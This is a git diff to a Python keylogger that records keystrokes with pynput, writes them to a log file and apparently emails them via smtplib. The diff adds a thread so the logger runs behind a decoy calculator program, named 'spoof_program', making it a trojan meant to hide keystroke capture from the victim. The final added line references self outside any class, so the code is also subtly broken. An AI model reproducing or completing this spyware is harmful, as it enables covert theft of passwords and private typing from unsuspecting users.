@@ -1,6 +1,9 @@
 from pynput import keyboard
 import logging
 import sys
+
+import threading
+
 # Import smtplib for the actual sending function
 import smtplib
 from datetime import datetime
@@ -10,6 +13,8 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 # from email import MIMEText
 
+from calculator import *
+
 # not used yet
 class KeyLogger:
 
@@ -18,6 +23,7 @@ class KeyLogger:
     logging.basicConfig(filename = (log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(message)s', filemode='w')
     def __init__(self):
         self.listener = None
+        self.spoof_program = None
 
     def init(self):
         self.messageArray = []
@@ -59,6 +65,7 @@ class KeyLogger:
                     self.outputMessage = ""
 
             if abc == 'Key.escape':
+                self.spoof_program.quit(self)
                 sys.exit()
 
             if(abc == 'Key.enter'):
@@ -115,18 +122,12 @@ class KeyLogger:
       print("email sent")
 
 
-
-
-    # Collect events until released
-    """
-    with keyboard.Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
-        listener.join() """
-
 def main_program():
     keylogger = KeyLogger()
     keylogger.init()
 
+# start thread so both programs can be runned at the same time
+x = threading.Thread(target=main_program) #, args=(1,)
+x.start()
 
-main_program()
+self.spoof_program = Calculator()
